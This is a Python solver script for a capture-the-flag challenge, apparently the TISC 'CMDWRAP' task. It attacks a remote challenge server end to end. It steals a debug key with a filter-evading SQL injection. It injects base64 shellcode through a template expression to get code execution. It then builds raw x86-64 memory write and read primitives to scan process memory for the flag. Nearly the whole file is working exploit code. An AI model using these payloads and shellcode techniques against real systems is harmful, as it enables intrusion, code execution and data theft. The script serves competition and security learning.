#!/usr/bin/env python3
"""End-to-end remote solver for the authorized TISC CMDWRAP challenge."""

from __future__ import annotations

import base64
import pathlib
import re

import multiwrite_override as mw


HERE = pathlib.Path(__file__).resolve().parent
START_MARKER = bytes.fromhex("8877665544332211")
NBSP = "\N{NO-BREAK SPACE}".encode()


def main() -> int:
    stage = (HERE / "scan_flag_memory.bin").read_bytes()
    exploit = mw.Exploit("cmdwrap.chals.tisc26.ctf.sg", 4444, 4)
    debug_prefix = b""

    def discover_debug_key() -> bytes:
        """Exfiltrate the deployment-specific debug key through catalog SQLi."""
        mw.oc.load_direct(exploit.client, b"file_download", exploit.sid)
        alias = b"cheat" + NBSP
        filename = alias + b".dll"
        query = b"'\tUNION\tSELECT\tgroup_concat(key)\tFROM\tdebug_info--"
        exploit.write_configured(query)
        exploit.client.cmd(b"add_capability " + alias + b" " + query)
        reply = exploit.client.cmd(b"file_download " + filename)
        marker = re.search(rb" begin (\d+)\r\n", reply)
        if not marker:
            raise RuntimeError(f"could not download debug-key query result: {reply!r}")
        size = int(marker.group(1))
        body = reply[marker.end() : marker.end() + size]
        key = re.search(rb"dbg_[0-9a-f]{8}", body)
        if not key:
            raise RuntimeError(f"catalog returned no debug key: {body!r}")
        return key.group(0)

    def run(code: bytes) -> int:
        value = debug_prefix + b"{{dbg.x('" + base64.b64encode(code) + b"')}}"
        if len(value) > 220:
            raise ValueError((len(value), len(code)))
        exploit.write_configured(value)
        reply = exploit.client.cmd(b"help")
        match = re.search(
            rb"Debug Session: " + re.escape(exploit.sid) + rb"([0-9a-f]{16})",
            reply,
        )
        if not match:
            raise RuntimeError(f"no shellcode return value: {reply!r}")
        return int(match.group(1), 16)

    def write_page(base: int, offset: int, data: bytes) -> None:
        for outer in range(0, len(data), 40):
            piece = data[outer : outer + 40].ljust(40, b"\x90")
            writer = bytearray(b"\x57\x48\xbf" + base.to_bytes(8, "little"))
            for inner in range(0, 40, 8):
                writer += b"\x48\xb8" + piece[inner : inner + 8]
                writer += b"\x48\x89\x87" + (offset + outer + inner).to_bytes(4, "little")
            writer += b"\x31\xc0\x5f\xc3"
            run(bytes(writer))

    def read_c_string(address: int, limit: int = 128) -> bytes:
        result = bytearray()
        for offset in range(0, limit, 8):
            value = run(b"\x48\xa1" + (address + offset).to_bytes(8, "little") + b"\xc3")
            result += value.to_bytes(8, "little")
            if b"\0" in result or b"}" in result:
                break
        return bytes(result).split(b"\0", 1)[0].split(b"}", 1)[0] + b"}"

    try:
        if stage.count(START_MARKER) != 1:
            raise RuntimeError("scan stage marker is not unique")
        start_offset = stage.index(START_MARKER)
        stage = stage.replace(START_MARKER, (0x10000).to_bytes(8, "little"))
        exploit.prepare()
        key = discover_debug_key()
        debug_prefix = b":" + key + b":" + exploit.sid
        print(f"sid={exploit.sid.decode()} debug_key={key.decode()}")
        base = run(b"\x48\x8d\x05\xf9\xff\xff\xff\xc3")
        write_page(base, 0, stage)
        print(f"stage={len(stage)} base={base:#x}")

        start = 0x10000
        for index in range(24):
            write_page(base, start_offset, start.to_bytes(8, "little"))
            address = run(b"\x48\xb8" + base.to_bytes(8, "little") + b"\xff\xe0")
            if not address:
                print("no more TISC strings")
                return 1
            value = read_c_string(address)
            print(f"match[{index}] address={address:#x} value={value!r}")
            if value.startswith(b"TISC{") and b"PLACEHOLDER" not in value and value.endswith(b"}"):
                (HERE / "flag.txt").write_bytes(value + b"\n")
                print("FLAG=" + value.decode("ascii", "replace"))
                return 0
            start = address + 5
        return 2
    finally:
        exploit.close()


if __name__ == "__main__":
    raise SystemExit(main())
